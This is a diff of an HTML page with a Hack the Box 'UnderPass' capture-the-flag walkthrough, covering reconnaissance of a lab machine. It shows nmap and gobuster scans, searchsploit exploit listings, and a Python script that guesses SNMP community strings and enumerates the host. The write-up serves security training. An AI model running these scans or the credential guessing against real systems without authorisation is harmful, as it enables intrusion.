@@ -1,383 +1,383 @@
 <!doctype html><html lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Hack the Box - UnderPass (Easy) Walkthrough</title>
 <link rel=stylesheet href=/style.css><style>.navbar-container{display:flex;flex-direction:column;align-items:center;margin-bottom:2rem}.logo-full{display:block;margin:2rem auto .5rem;max-width:720px;height:256px;object-fit:contain}nav.navbar{display:flex;justify-content:center;align-items:center;gap:2.5rem;margin-bottom:1.5rem}.navbar-link{color:#eaeaea;font-size:1.1rem;text-decoration:none;font-weight:500;display:flex;align-items:center;transition:color .2s}.navbar-link:hover{color:#6ec1e4}.navbar-logo-text{height:2.2rem;width:auto;display:block}@media(max-width:600px){.logo-full{max-width:120px;height:40px}nav.navbar{gap:1.2rem}.navbar-logo-text{height:1.3rem}}</style></head><body><div class=navbar-container><a href=/><img src=/logofull.png alt="gentlem00se full logo" class=logo-full></a><nav class=navbar><a href=/ class=navbar-link>Home</a>
 <a href=/categories/ class=navbar-link>Categories</a>
-<a href=/about/ class=navbar-link>About</a></nav></div><div class=center-container><article class=post-article><h1>Hack the Box - UnderPass (Easy) Walkthrough</h1><div class=post-date>Jun 23, 2025</div><div class=post-content><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/underpass-htb-walkthrough/UnderPass.png alt="Underpass HTB Walkthrough" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><h3 id=box-info>Box Info</h3><p><strong>Box Name:</strong> Underpass<br><strong>Listed Difficulty Rating:</strong> Easy<br><strong>chasepd&rsquo;s Difficulty Rating:</strong> Easy<br><strong>Release Date:</strong> 2024<br><strong>Tech Stack:</strong> SNMP, Daloradius, Mosh<br><strong>Skills Learned:</strong> SNMP enumeration, open-source software recon, mosh, sudo abuse</p><h3 id=recon>Recon</h3><p>To start, add some hostnames to <code>/etc/hosts/</code> to make referencing the box easier. I always add <code>boxname</code> as well as <code>boxname.htb</code> to start with.</p><p>Next, we run an nmap scan to get some basic intel on the machine.</p><pre tabindex=0><code>└─$ nmap -oN nmapscan -T4 -p- -A underpass.htb
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 15:51 MDT
-Nmap scan report for underpass (10.129.231.213)
-Host is up (0.066s latency).
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
-|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
-80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
-|_http-server-header: Apache/2.4.52 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Device type: general purpose|router
-Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
-OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 554/tcp)
-HOP RTT      ADDRESS
-1   67.71 ms 10.10.14.1
-2   68.04 ms underpass (10.129.231.213)
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 30.17 seconds
-</code></pre><p>We can see that there&rsquo;s a web host but it&rsquo;s only serving a default web page: <code>http-title: Apache2 Ubuntu Default Page: It works</code>. Given that there&rsquo;s nothing else but an SSH server on the host, we have four options for proceeding further:</p><ul><li>Run web enumeration and see if there&rsquo;s anything hiding on the web server</li><li>Look for a vulnerability in the Apache version</li><li>Look for a vulnerability in the SSH server</li><li>Scan UDP ports and see if there are any other services running on UDP</li></ul><p>Some quick <code>searchsploit</code> searches show us there aren&rsquo;t any published exploits for the Apache or SSH server versions, at least:</p><pre tabindex=0><code>└─$ searchsploit apache 2.4
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                                           |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - cgi-bin Remote Code Execution                                                                                          | php/remote/29290.c
-Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - Remote Code Execution + Scanner                                                                                        | php/remote/29316.py
-Apache 2.2.4 - 413 Error HTTP Request Method Cross-Site Scripting                                                                                        | unix/remote/30835.sh
-Apache 2.4.17 - Denial of Service                                                                                                                        | windows/dos/39037.php
-Apache 2.4.17 &lt; 2.4.38 - &#39;apache2ctl graceful&#39; &#39;logrotate&#39; Local Privilege Escalation                                                                    | linux/local/46676.php
-Apache 2.4.23 mod_http2 - Denial of Service                                                                                                              | linux/dos/40909.py
-Apache 2.4.7 + PHP 7.0.2 - &#39;openssl_seal()&#39; Uninitialized Memory Code Execution                                                                          | php/remote/40142.php
-Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                                                             | linux/dos/34133.txt
-Apache 2.4.x - Buffer Overflow                                                                                                                           | multiple/webapps/51193.py
-Apache &lt; 2.2.34 / &lt; 2.4.27 - OPTIONS Memory Leak                                                                                                         | linux/webapps/42745.py
-Apache CXF &lt; 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                      | multiple/dos/26710.txt
-Apache HTTP Server 2.4.49 - Path Traversal &amp; Remote Code Execution (RCE)                                                                                 | multiple/webapps/50383.sh
-Apache HTTP Server 2.4.50 - Path Traversal &amp; Remote Code Execution (RCE)                                                                                 | multiple/webapps/50406.sh
-Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2)                                                                                              | multiple/webapps/50446.sh
-Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)                                                                                              | multiple/webapps/50512.py
-Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck.c&#39; Remote Buffer Overflow                                                                                     | unix/remote/21671.c
-Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (1)                                                                               | unix/remote/764.c
-Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (2)                                                                               | unix/remote/47080.c
-Apache OpenMeetings 1.9.x &lt; 3.1.0 - &#39;.ZIP&#39; File Directory Traversal                                                                                      | linux/webapps/39642.txt
-Apache Shiro 1.2.4 - Cookie RememberME Deserial RCE (Metasploit)                                                                                         | multiple/remote/48410.rb
-Apache Tomcat 3.2.3/3.2.4 - &#39;RealPath.jsp&#39; Information Disclosuree                                                                                       | multiple/remote/21492.txt
-Apache Tomcat 3.2.3/3.2.4 - &#39;Source.jsp&#39; Information Disclosure                                                                                          | multiple/remote/21490.txt
-Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Disclosure                                                                                  | multiple/remote/21491.txt
-Apache Tomcat &lt; 5.5.17 - Remote Directory Listing                                                                                                        | multiple/remote/2061.txt
-Apache Tomcat &lt; 6.0.18 - &#39;utf8&#39; Directory Traversal                                                                                                      | unix/remote/14489.c
-Apache Tomcat &lt; 6.0.18 - &#39;utf8&#39; Directory Traversal (PoC)                                                                                                | multiple/remote/6229.txt
-Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                             | windows/webapps/42953.txt
-Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                             | jsp/webapps/42966.py
-Apache Xerces-C XML Parser &lt; 3.1.2 - Denial of Service (PoC)                                                                                             | linux/dos/36906.txt
-Webfroot Shoutbox &lt; 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                                         | linux/remote/34.pl
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-└─$ searchsploit openssh 8.9
-Exploits: No Results
-Shellcodes: No Results
-</code></pre><p>That doesn&rsquo;t necessarily mean there isn&rsquo;t a vulnerability there, but it seems like a dead end, especially when there are other avenues to explore. Let&rsquo;s try web enumeration next. We can scan for files as well as possible hidden subdomains at the same time.</p><p>Interestingly, neither of them give us much to work with:</p><pre tabindex=0><code>└─$ gobuster dir -u http://underpass.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://underpass.htb/
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/server-status        (Status: 403) [Size: 278]
-Progress: 220559 / 220560 (100.00%)
-===============================================================
-Finished
-===============================================================
-
-└─$ gobuster dir -u http://underpass.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,php -t 50
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://underpass.htb/
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              html,php
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/.htpasswd.html       (Status: 403) [Size: 278]
-/.htaccess            (Status: 403) [Size: 278]
-/.htaccess.html       (Status: 403) [Size: 278]
-/.htaccess.php        (Status: 403) [Size: 278]
-/.htpasswd.php        (Status: 403) [Size: 278]
-/.htpasswd            (Status: 403) [Size: 278]
-/index.html           (Status: 200) [Size: 10671]
-/server-status        (Status: 403) [Size: 278]
-Progress: 61434 / 61437 (100.00%)
-===============================================================
-Finished
-===============================================================
-
-└─$ gobuster vhost --append-domain -u http://underpass.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:             http://underpass.htb/
-[+] Method:          GET
-[+] Threads:         10
-[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
-[+] User Agent:      gobuster/3.6
-[+] Timeout:         10s
-[+] Append Domain:   true
-===============================================================
-Starting gobuster in VHOST enumeration mode
-===============================================================
-Progress: 19966 / 19967 (99.99%)
-===============================================================
-Finished
-===============================================================
-</code></pre><p>Guess it&rsquo;s time to try UDP?</p><p>Sure enough:</p><pre tabindex=0><code># Nmap 7.95 scan initiated Mon Jun 23 16:23:28 2025 as: /usr/lib/nmap/nmap --privileged -oN udpscan -sU -vvv underpass
-Increasing send delay for 10.129.231.213 from 50 to 100 due to 11 out of 15 dropped probes since last increase.
-Increasing send delay for 10.129.231.213 from 100 to 200 due to 11 out of 15 dropped probes since last increase.
-Increasing send delay for 10.129.231.213 from 200 to 400 due to 11 out of 14 dropped probes since last increase.
-Increasing send delay for 10.129.231.213 from 400 to 800 due to 11 out of 19 dropped probes since last increase.
-Nmap scan report for underpass (10.129.231.213)
-Host is up, received reset ttl 63 (0.065s latency).
-Scanned at 2025-06-23 16:23:28 MDT for 1253s
-Not shown: 996 closed udp ports (port-unreach)
-PORT     STATE         SERVICE REASON
-68/udp   open|filtered dhcpc   no-response
-161/udp  open          snmp    udp-response ttl 63
-1812/udp open|filtered radius  no-response
-1813/udp open|filtered radacct no-response
-
-Read data files from: /usr/share/nmap
-# Nmap done at Mon Jun 23 16:44:21 2025 -- 1 IP address (1 host up) scanned in 1252.87 seconds
-</code></pre><h3 id=foothold>Foothold</h3><p>Using a python script we can enumerate SNMP:</p><pre tabindex=0><code>import asyncio
-from pysnmp.hlapi.v3arch.asyncio import (
-    SnmpEngine, CommunityData, UdpTransportTarget, ContextData,
-    ObjectType, ObjectIdentity, walk_cmd
-)
-
-### SNMP Enumeration Script for Hack the Box
-
-HOST = &#34;underpass.htb&#34;
-PORT = 161
-
-# List of interesting OID roots to walk
-OID_ROOTS = [
-    (&#34;System&#34;, &#34;1.3.6.1.2.1.1&#34;),
-    (&#34;Interfaces&#34;, &#34;1.3.6.1.2.1.2&#34;),
-    (&#34;IP&#34;, &#34;1.3.6.1.2.1.4&#34;),
-    (&#34;TCP&#34;, &#34;1.3.6.1.2.1.6&#34;),
-    (&#34;UDP&#34;, &#34;1.3.6.1.2.1.7&#34;),
-    (&#34;Host Resources&#34;, &#34;1.3.6.1.2.1.25.1&#34;)
-]
-
-async def snmp_walk(community_string, oid, label=None):
-    transport = await UdpTransportTarget.create((HOST, PORT))
-    found_any = False
-    if label:
-        print(f&#34;\n--- {label} ({oid}) ---&#34;)
-    async for (errorIndication, errorStatus, errorIndex, varBinds) in walk_cmd(
-        SnmpEngine(),
-        CommunityData(community_string, mpModel=0),  # SNMPv1
-        transport,
-        ContextData(),
-        ObjectType(ObjectIdentity(oid)),
-    ):
-        if errorIndication:
-            print(f&#34;Error: {errorIndication}&#34;)
-            break
-        elif errorStatus:
-            print(f&#34;Error: {errorStatus.prettyPrint()} at {errorIndex and varBinds[int(errorIndex) - 1][0] or &#39;?&#39;}&#34;)
-            break
-        else:
-            for varBind in varBinds:
-                print(f&#34;{varBind[0]} = {varBind[1]}&#34;)
-                found_any = True
-    if not found_any:
-        print(&#34;No results or access denied.&#34;)
-    return found_any
-
-async def main():
-    print(f&#34;Enumerating SNMP on {HOST}:{PORT}&#34;)
-    community_strings = [
-        &#34;public&#34;,
-        &#34;private&#34;,
-        &#34;manager&#34;,
-        &#34;admin&#34;,
-        &#34;root&#34;,
-        &#34;snmp&#34;,
-        &#34;snmpwalk&#34;,
-        &#34;snmpwalk2&#34;,
-    ]
-
-    valid_communities = []
-    for community in community_strings:
-        print(f&#34;Trying community string: {community}&#34;)
-        if await snmp_walk(community, &#34;1.3.6.1.2.1.1&#34;, label=&#34;System (Test)&#34;):
-            print(f&#34;\nFound valid community string: {community}\n&#34;)
-            valid_communities.append(community)
-        else:
-            print(f&#34;Community string {community} is not valid.&#34;)
-
-    if not valid_communities:
-        print(&#34;No valid community strings found.&#34;)
-        return
-
-    for community in valid_communities:
-        print(f&#34;\n===== Enumerating data for community string: {community} =====&#34;)
-        for label, oid in OID_ROOTS:
-            if oid == &#34;1.3.6.1.2.1.1&#34;:  # Skip System, already done
-                continue
-            await snmp_walk(community, oid, label=label)
-
-if __name__ == &#34;__main__&#34;:
-    asyncio.run(main())
-</code></pre><pre tabindex=0><code>└─$ python snmp-explore.py
-Enumerating SNMP on underpass.htb:161
-Trying community string: public
-
---- System (Test) (1.3.6.1.2.1.1) ---
-1.3.6.1.2.1.1.1.0 = Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
-1.3.6.1.2.1.1.2.0 = 1.3.6.1.4.1.8072.3.2.10
-1.3.6.1.2.1.1.3.0 = 450000
-1.3.6.1.2.1.1.4.0 = steve@underpass.htb
-1.3.6.1.2.1.1.5.0 = UnDerPass.htb is the only daloradius server in the basin!
-1.3.6.1.2.1.1.6.0 = Nevada, U.S.A. but not Vegas
-1.3.6.1.2.1.1.7.0 = 72
-1.3.6.1.2.1.1.8.0 = 1
-1.3.6.1.2.1.1.9.1.2.1 = 1.3.6.1.6.3.10.3.1.1
-1.3.6.1.2.1.1.9.1.2.2 = 1.3.6.1.6.3.11.3.1.1
-1.3.6.1.2.1.1.9.1.2.3 = 1.3.6.1.6.3.15.2.1.1
-1.3.6.1.2.1.1.9.1.2.4 = 1.3.6.1.6.3.1
-1.3.6.1.2.1.1.9.1.2.5 = 1.3.6.1.6.3.16.2.2.1
-1.3.6.1.2.1.1.9.1.2.6 = 1.3.6.1.2.1.49
-1.3.6.1.2.1.1.9.1.2.7 = 1.3.6.1.2.1.50
-1.3.6.1.2.1.1.9.1.2.8 = 1.3.6.1.2.1.4
-1.3.6.1.2.1.1.9.1.2.9 = 1.3.6.1.6.3.13.3.1.3
-1.3.6.1.2.1.1.9.1.2.10 = 1.3.6.1.2.1.92
-1.3.6.1.2.1.1.9.1.3.1 = The SNMP Management Architecture MIB.
-1.3.6.1.2.1.1.9.1.3.2 = The MIB for Message Processing and Dispatching.
-1.3.6.1.2.1.1.9.1.3.3 = The management information definitions for the SNMP User-based Security Model.
-1.3.6.1.2.1.1.9.1.3.4 = The MIB module for SNMPv2 entities
-1.3.6.1.2.1.1.9.1.3.5 = View-based Access Control Model for SNMP.
-1.3.6.1.2.1.1.9.1.3.6 = The MIB module for managing TCP implementations
-1.3.6.1.2.1.1.9.1.3.7 = The MIB module for managing UDP implementations
-1.3.6.1.2.1.1.9.1.3.8 = The MIB module for managing IP and ICMP implementations
-1.3.6.1.2.1.1.9.1.3.9 = The MIB modules for managing SNMP Notification, plus filtering.
-1.3.6.1.2.1.1.9.1.3.10 = The MIB module for logging SNMP Notifications.
-1.3.6.1.2.1.1.9.1.4.1 = 1
-1.3.6.1.2.1.1.9.1.4.2 = 1
-1.3.6.1.2.1.1.9.1.4.3 = 1
-1.3.6.1.2.1.1.9.1.4.4 = 1
-1.3.6.1.2.1.1.9.1.4.5 = 1
-1.3.6.1.2.1.1.9.1.4.6 = 1
-1.3.6.1.2.1.1.9.1.4.7 = 1
-1.3.6.1.2.1.1.9.1.4.8 = 1
-1.3.6.1.2.1.1.9.1.4.9 = 1
-1.3.6.1.2.1.1.9.1.4.10 = 1
-1.3.6.1.2.1.25.1.1.0 = 452067
-1.3.6.1.2.1.25.1.2.0 = é+
-1.3.6.1.2.1.25.1.3.0 = 393216
-1.3.6.1.2.1.25.1.4.0 = BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
-
-1.3.6.1.2.1.25.1.5.0 = 0
-1.3.6.1.2.1.25.1.6.0 = 217
-1.3.6.1.2.1.25.1.7.0 = 0
-
-Found valid community string: public
-
-Trying community string: private
-
---- System (Test) (1.3.6.1.2.1.1) ---
-Error: No SNMP response received before timeout
-No results or access denied.
-Community string private is not valid.
-Trying community string: manager
-
---- System (Test) (1.3.6.1.2.1.1) ---
-Error: No SNMP response received before timeout
-No results or access denied.
-Community string manager is not valid.
-Trying community string: admin
-
---- System (Test) (1.3.6.1.2.1.1) ---
-Error: No SNMP response received before timeout
-No results or access denied.
-Community string admin is not valid.
-Trying community string: root
-
---- System (Test) (1.3.6.1.2.1.1) ---
-Error: No SNMP response received before timeout
-No results or access denied.
-Community string root is not valid.
-Trying community string: snmp
-
---- System (Test) (1.3.6.1.2.1.1) ---
-Error: No SNMP response received before timeout
-No results or access denied.
-Community string snmp is not valid.
-Trying community string: snmpwalk
-
---- System (Test) (1.3.6.1.2.1.1) ---
-Error: No SNMP response received before timeout
-No results or access denied.
-Community string snmpwalk is not valid.
-Trying community string: snmpwalk2
-
---- System (Test) (1.3.6.1.2.1.1) ---
-Error: No SNMP response received before timeout
-No results or access denied.
-Community string snmpwalk2 is not valid.
-
-===== Enumerating data for community string: public =====
-
---- Interfaces (1.3.6.1.2.1.2) ---
-Error: No SNMP response received before timeout
-No results or access denied.
-
---- IP (1.3.6.1.2.1.4) ---
-1.3.6.1.2.1.25.1.1.0 = 457304
-1.3.6.1.2.1.25.1.2.0 = é+
-1.3.6.1.2.1.25.1.3.0 = 393216
-1.3.6.1.2.1.25.1.4.0 = BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
-
-1.3.6.1.2.1.25.1.5.0 = 0
-1.3.6.1.2.1.25.1.6.0 = 217
-1.3.6.1.2.1.25.1.7.0 = 0
-
---- TCP (1.3.6.1.2.1.6) ---
-1.3.6.1.2.1.25.1.1.0 = 457364
-1.3.6.1.2.1.25.1.2.0 = é+
-1.3.6.1.2.1.25.1.3.0 = 393216
-1.3.6.1.2.1.25.1.4.0 = BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
-
-1.3.6.1.2.1.25.1.5.0 = 0
-1.3.6.1.2.1.25.1.6.0 = 217
-1.3.6.1.2.1.25.1.7.0 = 0
-
---- UDP (1.3.6.1.2.1.7) ---
-1.3.6.1.2.1.25.1.1.0 = 457436
-1.3.6.1.2.1.25.1.2.0 = é+
-1.3.6.1.2.1.25.1.3.0 = 393216
-1.3.6.1.2.1.25.1.4.0 = BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
-
-1.3.6.1.2.1.25.1.5.0 = 0
-1.3.6.1.2.1.25.1.6.0 = 217
-1.3.6.1.2.1.25.1.7.0 = 0
-
---- Host Resources (1.3.6.1.2.1.25.1) ---
-1.3.6.1.2.1.25.1.1.0 = 457691
-1.3.6.1.2.1.25.1.2.0 = é+
-1.3.6.1.2.1.25.1.3.0 = 393216
-1.3.6.1.2.1.25.1.4.0 = BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
-
-1.3.6.1.2.1.25.1.5.0 = 0
-1.3.6.1.2.1.25.1.6.0 = 217
-1.3.6.1.2.1.25.1.7.0 = 0
-</code></pre><p>Interesting - we now have a username: <code>steve</code>. We also know there is a <a href=https://www.daloradius.com/>daloradius</a> server running.</p><p><code>http://underpass.htb/daloradius/</code> returns a 403, but now we have a new directory to enumerate. Checking out our findings from a quick scan from dirsearch, <code>http://underpass.htb/daloradius/ChangeLog</code> gives us a version number - 1.1-3.</p><p><code>http://underpass.htb/daloradius/.gitignore</code> gives us some interesting file paths:</p><pre tabindex=0><code>.idea/
+<a href=/about/ class=navbar-link>About</a></nav></div><div class=center-container><article class=post-article><h1>Hack the Box - UnderPass (Easy) Walkthrough</h1><div class=post-date>Jun 23, 2025</div><div class=post-content><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/underpass-htb-walkthrough/UnderPass.png alt="Underpass HTB Walkthrough" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><h3 id=box-info>Box Info</h3><p><strong>Box Name:</strong> Underpass<br><strong>Listed Difficulty Rating:</strong> Easy<br><strong>chasepd&rsquo;s Difficulty Rating:</strong> Easy<br><strong>Release Date:</strong> 2024<br><strong>Tech Stack:</strong> SNMP, Daloradius, Mosh<br><strong>Skills Learned:</strong> SNMP enumeration, open-source software recon, mosh, sudo abuse</p><h3 id=recon>Recon</h3><p>To start, add some hostnames to <code>/etc/hosts/</code> to make referencing the box easier. I always add <code>boxname</code> as well as <code>boxname.htb</code> to start with.</p><p>Next, we run an nmap scan to get some basic intel on the machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ nmap -oN nmapscan -T4 -p- -A underpass.htb
+</span></span><span style=display:flex><span>Starting Nmap 7.95 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2025-06-23 15:51 MDT
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> underpass <span style=color:#f92672>(</span>10.129.231.213<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.066s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey:
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.52 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.52 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style=display:flex><span>Device type: general purpose|router
+</span></span><span style=display:flex><span>Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+</span></span><span style=display:flex><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+</span></span><span style=display:flex><span>OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 <span style=color:#f92672>(</span>Linux 5.6.3<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 554/tcp<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>HOP RTT      ADDRESS
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   67.71 ms 10.10.14.1
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   68.04 ms underpass <span style=color:#f92672>(</span>10.129.231.213<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 30.17 seconds
+</span></span></code></pre></div><p>We can see that there&rsquo;s a web host but it&rsquo;s only serving a default web page: <code>http-title: Apache2 Ubuntu Default Page: It works</code>. Given that there&rsquo;s nothing else but an SSH server on the host, we have four options for proceeding further:</p><ul><li>Run web enumeration and see if there&rsquo;s anything hiding on the web server</li><li>Look for a vulnerability in the Apache version</li><li>Look for a vulnerability in the SSH server</li><li>Scan UDP ports and see if there are any other services running on UDP</li></ul><p>Some quick <code>searchsploit</code> searches show us there aren&rsquo;t any published exploits for the Apache or SSH server versions, at least:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ searchsploit apache 2.4
+</span></span><span style=display:flex><span>--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span> Exploit Title                                                                                                                                           |  Path
+</span></span><span style=display:flex><span>--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span>Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - cgi-bin Remote Code Execution                                                                                          | php/remote/29290.c
+</span></span><span style=display:flex><span>Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - Remote Code Execution + Scanner                                                                                        | php/remote/29316.py
+</span></span><span style=display:flex><span>Apache 2.2.4 - <span style=color:#ae81ff>413</span> Error HTTP Request Method Cross-Site Scripting                                                                                        | unix/remote/30835.sh
+</span></span><span style=display:flex><span>Apache 2.4.17 - Denial of Service                                                                                                                        | windows/dos/39037.php
+</span></span><span style=display:flex><span>Apache 2.4.17 &lt; 2.4.38 - <span style=color:#e6db74>&#39;apache2ctl graceful&#39;</span> <span style=color:#e6db74>&#39;logrotate&#39;</span> Local Privilege Escalation                                                                    | linux/local/46676.php
+</span></span><span style=display:flex><span>Apache 2.4.23 mod_http2 - Denial of Service                                                                                                              | linux/dos/40909.py
+</span></span><span style=display:flex><span>Apache 2.4.7 + PHP 7.0.2 - <span style=color:#e6db74>&#39;openssl_seal()&#39;</span> Uninitialized Memory Code Execution                                                                          | php/remote/40142.php
+</span></span><span style=display:flex><span>Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                                                             | linux/dos/34133.txt
+</span></span><span style=display:flex><span>Apache 2.4.x - Buffer Overflow                                                                                                                           | multiple/webapps/51193.py
+</span></span><span style=display:flex><span>Apache &lt; 2.2.34 / &lt; 2.4.27 - OPTIONS Memory Leak                                                                                                         | linux/webapps/42745.py
+</span></span><span style=display:flex><span>Apache CXF &lt; 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                      | multiple/dos/26710.txt
